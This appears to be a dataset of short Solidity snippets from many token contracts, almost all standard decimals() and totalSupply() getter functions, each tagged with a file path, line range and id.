<source file="systems/source-code/0x6FB11C60e84916968b4c70ca80889BD13fbEDA9b.sol" startline="61" endline="63" pcid="4075">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xF6d9Db3461567c11929e641c6beb075213efEc9d.sol" startline="62" endline="64" pcid="9019">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x957611a96e326c3b8aEa24B545Cd84bA72Ff0A9d.sol" startline="59" endline="61" pcid="5416">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x958e1604174Ea6BD0932ca9E577f01088499897a.sol" startline="62" endline="64" pcid="5446">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x5ba66281ec78ee1a83e7a449d1692b0fda7023e2.sol" startline="47" endline="49" pcid="3497">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x613D596e4500c1538214bf023e3151DaA7555E97.sol" startline="56" endline="58" pcid="3725">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x1b6B980b58C60aB35EeE3894Fc225E711B20f472.sol" startline="61" endline="63" pcid="857">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x0934865C5546d21B4fD998bd5E1D3a5cD351D961.sol" startline="62" endline="64" pcid="260">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x523747c5bed9b50161c801b4a4b7a7799a1add3c.sol" startline="49" endline="51" pcid="3037">
    function decimals() public view override returns (uint8) {
        return _decimals;
    }
</source>
<source file="systems/source-code/0x523747c5bed9b50161c801b4a4b7a7799a1add3c.sol" startline="53" endline="55" pcid="3038">
    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }
</source>
<source file="systems/source-code/0x690C351f059c4963362cB75AAb802A2b95bA2B0C.sol" startline="58" endline="60" pcid="3903">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xfDC34A848cBc058f5D246D22b3d9B96eB7d5a301.sol" startline="59" endline="61" pcid="9275">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x35539cc6f1f1c0449474fdaaa0939893457163da.sol" startline="60" endline="62" pcid="1782">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x52739F8b5C2bCD8290403e21463615B8B952f049.sol" startline="60" endline="62" pcid="3056">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xE93B81908F25a136AEC81715E3673274d46D5b62.sol" startline="62" endline="64" pcid="8437">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xdCfb3170A71BE65d6Ae3d70F7B617fa2B467975f.sol" startline="58" endline="60" pcid="7833">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x892128b76b80C251F79B8F2E2fa300eE7546831A.sol" startline="59" endline="61" pcid="5090">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x9074b21AB3452ABC15F7e15B6b7233EBe9Ed731f.sol" startline="386" endline="388" pcid="5280">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xB1426cE1931Bc2f72fF5eEcFf831679B1fe52c3b.sol" startline="57" endline="59" pcid="6514">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x49D141A0B0190d120039F603F434F51a39f33D6c.sol" startline="60" endline="62" pcid="2783">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x707dAb814AAE29c506EAfc8036b64066FC403444.sol" startline="58" endline="60" pcid="4131">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x033B28BE598a95363830624C0601E58AB03e9922.sol" startline="61" endline="63" pcid="123">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x53f9c54a9Ec424790E908df9068d746F6A25DE6A.sol" startline="64" endline="66" pcid="3116">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xfbefc1a66fa6c6fe5107942e12fa981e378b1791.sol" startline="58" endline="60" pcid="9190">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x98D29fe112bFce3C568b3e7B56CA95F4f684f2E2.sol" startline="62" endline="64" pcid="5543">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x6d1456049210842b851a60C4ca116179658eF07a.sol" startline="60" endline="62" pcid="4014">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xaa268b4717907181f8826e1e5bC6ffC4BA3da5A0.sol" startline="55" endline="57" pcid="6182">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x354d28d197c8be69ffa19267ac68f49eb992c8bb.sol" startline="975" endline="977" pcid="1722">
  function priceOracle() public override view returns (IPriceOracle) {
    return _priceOracle;
  }
</source>
<source file="systems/source-code/0xFd8a7A44c005013a2489f8253e44FD3BBCC2e02e.sol" startline="394" endline="396" pcid="9255">
  function totalSupply() external override view  returns (uint256) {
    return _totalSupply;
  }
</source>
<source file="systems/source-code/0xFd8a7A44c005013a2489f8253e44FD3BBCC2e02e.sol" startline="373" endline="375" pcid="9252">
  function decimals() external override view returns (uint8) {
    return _decimals;
  }
</source>
<source file="systems/source-code/0x39Ac510d21f06A31e1bf897138E441661f1942a8.sol" startline="60" endline="62" pcid="1927">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x888Ab493a44007445eBc70d5537eb29f95A2D3eC.sol" startline="64" endline="66" pcid="5060">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xdBE642963F5e8dF51Ccc6924B2bEfa8930149721.sol" startline="62" endline="64" pcid="7802">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x10682fF02FC98F7FB6ceA08e7a584262DB51a399.sol" startline="60" endline="62" pcid="431">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xe6306Af140F6eefa1d461Ff04a549D51FF4dd16B.sol" startline="58" endline="60" pcid="8317">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x837c26F4D6Be1E7466Fe92fE138b8c4af8C59D0C.sol" startline="62" endline="64" pcid="4930">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xaE940311F8bBFFfc2B198fFf5019b80b02a4F421.sol" startline="57" endline="59" pcid="6347">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xA5cAFA147f5970dc380A90F8eBB5296BD9e4cd57.sol" startline="61" endline="63" pcid="6048">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xefb888BC43e9BC7cA5312fBae0CD394Cf1A27af6.sol" startline="62" endline="64" pcid="8750">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x82f8c11f816693442b3a7d38cfba92abc7f356b0.sol" startline="45" endline="47" pcid="4912">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x847d2f49E856550F93f7aADF444528a024256372.sol" startline="62" endline="64" pcid="4945">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x700ab19C3D9FA23d1A194761eddD9986Aa620293.sol" startline="60" endline="62" pcid="4105">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x66bc620635dd4e5bebdc135489e7cb6f660b2064.sol" startline="55" endline="57" pcid="3837">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x821d158c454B3a3Fcef1B9f35DBa9cb0e37C5453.sol" startline="61" endline="63" pcid="4855">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x173F3b04bD4d245b0Bea67CcA11c18B062098EaF.sol" startline="61" endline="63" pcid="692">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x46a9D15f23306E44060fb3558CDF051dD9D83FA9.sol" startline="60" endline="62" pcid="2641">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x73Ff82219f9b9ba3fEbe8aed26C159378D4e00B2.sol" startline="63" endline="65" pcid="4268">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xc3269e2917AcF46F7eDF508cf875f8e29313dabF.sol" startline="58" endline="60" pcid="6983">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x2965DC16e5d7525240AFDac5315214170C1dBe26.sol" startline="59" endline="61" pcid="1257">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x550f95a80e42c5cfBc786C5C47322862e0332528.sol" startline="61" endline="63" pcid="3176">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xb07F1e635FbA15234B11A351Ee03Da67D11111B2.sol" startline="63" endline="65" pcid="6499">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xBe43ad4F6F0B27228aC7E54974a57470862FC8Bf.sol" startline="63" endline="65" pcid="6791">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x084C028E04F9C7aa04b2CeE80edE5DA2Fa3bbaF2.sol" startline="59" endline="61" pcid="210">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xA55a6E9BFC3Ba7cb2421146B8F111919bCfB0060.sol" startline="58" endline="60" pcid="6018">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x827f6ADc76821927E8f43ECA46eEC57d4338A421.sol" startline="126" endline="128" pcid="4897">
    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }
</source>
<source file="systems/source-code/0xa149cAa78E7BdE7F564162B17fc98D47B70DA95a.sol" startline="59" endline="61" pcid="5828">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xd4738e9EE70F7C409c5704A8243E2Cf75162098f.sol" startline="62" endline="64" pcid="7574">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xeE35812e1254Da3Bd81eA1ba4275f2001085d671.sol" startline="58" endline="60" pcid="8690">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x98dBba70df94bC4057a76E29067b5D5D5676f14c.sol" startline="62" endline="64" pcid="5558">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xf34839a7431d6c70673f3a3bcfb589c042fd219d.sol" startline="55" endline="57" pcid="8849">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xd1f939d7de311a475d3d97f2dadb1943dd1bb555.sol" startline="62" endline="64" pcid="7515">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x9c03094376D96C2b5ffd1B1C5129b048438700CF.sol" startline="57" endline="59" pcid="5672">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x9bd2cd50d1d2b8fbfc98164672bc02314e3341b4.sol" startline="59" endline="61" pcid="5657">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x819A8945dC5046816a7061Eb18b248e611c75085.sol" startline="58" endline="60" pcid="4840">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xe33c37cddb31548856537434d103e57d99242efb.sol" startline="61" endline="63" pcid="8212">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x9adA335674982c21785141cb8bD6B1e0f9ac1FC4.sol" startline="61" endline="63" pcid="5642">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xea0C5622A2E88392b1edb53e495a28491aC11fBA.sol" startline="64" endline="66" pcid="8467">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x3c8B8B3D57AE533C8A34A290327024f915335CA9.sol" startline="61" endline="63" pcid="2133">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x75d5d49F80871F23bEE1448070790A77C56d3d00.sol" startline="56" endline="58" pcid="4361">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x059DCcB34DeD089dBCe4d1CCd975d6D38891e138.sol" startline="62" endline="64" pcid="158">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x4701BD9e462012bC2A6D9e6aD71a132d7b64dF7d.sol" startline="59" endline="61" pcid="2671">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x398Fa4bd97036EB7cF85E84FbDe34959b4E4C396.sol" startline="62" endline="64" pcid="1912">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x3943a56c7b1efd43c3c952aec05cb295f0ab8c67.sol" startline="56" endline="58" pcid="1897">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x7639F0fCD891a5c1D72A986258580Bb28c12A94E.sol" startline="62" endline="64" pcid="4400">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x6495b9266304551eBa87fF9aD9c407Efd3c0a71c.sol" startline="58" endline="60" pcid="3802">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x14cf1d2a1da97600a7489c87a6d8bb57eb1fbc07.sol" startline="42" endline="44" pcid="588">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xDBc4b8F7D65167C5f44426dbb95Ec8921F629386.sol" startline="59" endline="61" pcid="7787">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x80a2f100cb796a142faca9f6ffc31dabb0b0663f.sol" startline="60" endline="62" pcid="4791">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xB9D25De4DC1E03a475f12ca3aAF1aFDC2407ea8e.sol" startline="63" endline="65" pcid="6715">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x729841D06c8D569c8Dc118d9f6a5c663583d709F.sol" startline="62" endline="64" pcid="4208">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xe0292d64ff7319abd8083e2bdae5ba81a56ada05.sol" startline="45" endline="47" pcid="8045">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x140682C8B95deC6Bd012303aFc86ca1D55C74E36.sol" startline="65" endline="67" pcid="561">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xe6817d8DC697e075e23273385e97D3528Ddd08d1.sol" startline="59" endline="61" pcid="8332">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xe75e3c43e328F92a66e787b5e4B81f5A271a78a5.sol" startline="58" endline="60" pcid="8347">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xd1a932685B4e94E152589C0f264a851812f25724.sol" startline="60" endline="62" pcid="7455">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x84A1dde0d0Bd23A2F4Cce011585b415ffdFE2582.sol" startline="61" endline="63" pcid="4966">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x2873e31F73f0dA96832ddcD0EB70006d6b17D228.sol" startline="62" endline="64" pcid="1242">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x7564011A8636815Db93dE33ceD4a65Ea0A8CF337.sol" startline="59" endline="61" pcid="4315">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x7c947C432A8b47feD452DbE026cc6648ad6a2cC6.sol" startline="62" endline="64" pcid="4658">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xa42284f1617bc85bd6c0139f9482b0908ee42915.sol" startline="60" endline="62" pcid="5959">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x78102a37f04eb263c1f626702f1c1f98618ea3de.sol" startline="134" endline="136" pcid="4501">
    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }
</source>
<source file="systems/source-code/0xbe8784905d6EfEf6935E715Cf2075dF356807306.sol" startline="59" endline="61" pcid="6808">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x77b3e393d8BC4ee7a6d0afff7eDeE5c449E61852.sol" startline="60" endline="62" pcid="4489">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x5d78329DB4EddA91c08E819b0E6a952ebBD05018.sol" startline="62" endline="64" pcid="3562">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xCf60d61616a64371DF34580AcE2b13401d29C55c.sol" startline="62" endline="64" pcid="7381">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x2116bc152192df8a87eb74dc69aa64f6f476f792.sol" startline="61" endline="63" pcid="1003">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x0d78d64e0889d8199001868faf1542c90cac768c.sol" startline="134" endline="136" pcid="370">
    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }
</source>
<source file="systems/source-code/0xefbd223978ababc08414ff766cf04028daa5266a.sol" startline="67" endline="69" pcid="8765">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x46e743046dccf9ab65b8454cdf879187aab5dd49.sol" startline="63" endline="65" pcid="2656">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xf53366b7eb8a67d2e1f41b0fc8619e082cd06666.sol" startline="40" endline="42" pcid="8970">
  function totalSupply() public view override returns (uint256) {
    return _totalSupply;
  }
</source>
<source file="systems/source-code/0x41074D4fAe6571188B306Ed26636a00E768E7Bb9.sol" startline="134" endline="136" pcid="2384">
    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }
</source>
<source file="systems/source-code/0xA49E5b1422AB286CFC8D54E0A7CBBdb3cd5aBFdB.sol" startline="63" endline="65" pcid="5974">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x75156ffc59Ed375F98D97dA888f2fe09382640a1.sol" startline="58" endline="60" pcid="4300">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xB34429e7E522e8cDdDC4D4a49E98E073bdfEa29a.sol" startline="55" endline="57" pcid="6551">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x6277c6BC834f6A1cCa9905696a5b6d4f459BC736.sol" startline="62" endline="64" pcid="3757">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xDe77F59a385B50d78aeB7C646d9dF1E4fD76f1a4.sol" startline="63" endline="65" pcid="7942">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x99D00D99221a9CFF03d0F48a6674b71A7d0893Fc.sol" startline="54" endline="56" pcid="5589">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x55C24F7AdB76f73E9d7FEF837FA0538edBd00280.sol" startline="60" endline="62" pcid="3191">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x585E00E541d4e331A7574248beC368420BBaDdf1.sol" startline="58" endline="60" pcid="3322">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x0232d83E731fB812b8A9A0497b75c73a1bC7655a.sol" startline="64" endline="66" pcid="79">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x97599936D137EFDD11Eaa2989F58f5a00BCd2803.sol" startline="57" endline="59" pcid="5481">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x8fE05D10B3c7aE008165Db5FA6a472c25E666A7F.sol" startline="61" endline="63" pcid="5265">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x3769cd9532CcE8550984AA8388a26Beda0E69401.sol" startline="64" endline="66" pcid="1863">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xc096251a6bb2e6c2015307be53fe60b01a4a7c3e.sol" startline="47" endline="49" pcid="6879">
    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }
</source>
<source file="systems/source-code/0x80243a2b6dfb564459fec3e729fda998a4b7a979.sol" startline="60" endline="62" pcid="4725">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x50c69EB4BA27356A09110a622Deb2A7B9C58f6c4.sol" startline="58" endline="60" pcid="2989">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xefF6ee6e86feF5f6b61560a3c99e7DCFf53f7bb6.sol" startline="58" endline="60" pcid="8780">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xCe07F8b4f1964E69cc6d52B7A8C4B07496CC4143.sol" startline="60" endline="62" pcid="7324">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xe0A9b2Cbd7147f9fb0fE09fAcD2aAB94C0f51444.sol" startline="678" endline="680" pcid="8074">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x4751AA52a743FFea38c4031e5158AcfA30347f26.sol" startline="57" endline="59" pcid="2686">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xFB1eef96272C53D608d11de7a92B1e7a0abF7DFc.sol" startline="63" endline="65" pcid="9127">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x569BFe249181f42c823bEBda9799e1E65f4254B6.sol" startline="61" endline="63" pcid="3236">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xc898c687bdb580D7430277a9bcB503547a09E5ff.sol" startline="61" endline="63" pcid="7163">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xCBf5E1478f1B77672a2684535D9aE9Fe1A7aBe5e.sol" startline="63" endline="65" pcid="7248">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xD1E4a04142D5B5174C6E7129C11740F73d721f5A.sol" startline="59" endline="61" pcid="7500">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x341F7b39D375195870915b0744c90D3c6459EEdd.sol" startline="59" endline="61" pcid="1609">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xF92050985936150572FCA5d8307bfd35771CDB54.sol" startline="55" endline="57" pcid="9073">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xe928e115184bad954b11c477df5e1fc94f04e45d.sol" startline="60" endline="62" pcid="8422">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x42825e496a72B5E3278af637a45B712E49c061A0.sol" startline="63" endline="65" pcid="2462">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xEC55D39A13F31B2674EFD7662bB7Debeb1B65948.sol" startline="61" endline="63" pcid="8597">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x47BCDA0202Cf59825388c1Fbc6A03B52dd068121.sol" startline="62" endline="64" pcid="2701">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x5ad359AaC713929412c9b802175A9f12E5cf9306.sol" startline="59" endline="61" pcid="3454">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xfd1e0ec0d64d806d833b80b8cbd01dfdc9062c3d.sol" startline="62" endline="64" pcid="9227">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xBD0DC4FC7a2797cA0bD2F0b8c792a8BF8dd96358.sol" startline="61" endline="63" pcid="6761">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x3c36CB64F2255b3558b0056E3c2F5C025E8B7a6d.sol" startline="64" endline="66" pcid="2078">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xB264455716277D6D1445A4B875efAb6DE8931F4a.sol" startline="58" endline="60" pcid="6536">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x5f4B753ddeb0Bc2f78D4bE446994BF0C0497D98e.sol" startline="62" endline="64" pcid="3595">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xc0df2A6330877c7632051E2A30e8Eb732fa1aE02.sol" startline="55" endline="57" pcid="6908">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x23e0b74aE3EC9f9B37AE2b13024Cc089e777E865.sol" startline="49" endline="51" pcid="1073">
    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }
</source>
<source file="systems/source-code/0xE413f21F74faC68bCd2c16626f0FCa30b55692Dd.sol" startline="60" endline="62" pcid="8272">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x4c9AE7Cbc12242F162DdeAab10B57Fff01AF836d.sol" startline="59" endline="61" pcid="2880">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x2362dE6A331ca1f0f5243CE99792dbEdab68D184.sol" startline="63" endline="65" pcid="1063">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xCE641a63a438f15A3929C0A66b1428448ccfFaae.sol" startline="64" endline="66" pcid="7339">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x887503fb56fDD4b0C97dD5ad5f01EACc4847E682.sol" startline="60" endline="62" pcid="5045">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x0D33f227b588446F1Bff2b07AE00fF69EB086876.sol" startline="62" endline="64" pcid="343">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xA2F5f226ab0cC49602dFf5e178AC9bC978869395.sol" startline="58" endline="60" pcid="5862">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xE78A151431cC384BC2Dee2dBd5115f58b1A63D6c.sol" startline="58" endline="60" pcid="8362">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xb5c5017c98549049c1d1Cf46e3d0eA7882a21B33.sol" startline="62" endline="64" pcid="6609">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xf86c25675cd74be058a798894008ecf6a67dca21.sol" startline="61" endline="63" pcid="9041">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x445e4AEE9f66Fc3c4a68EBD67B2329Ff5ba5EcDc.sol" startline="60" endline="62" pcid="2538">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
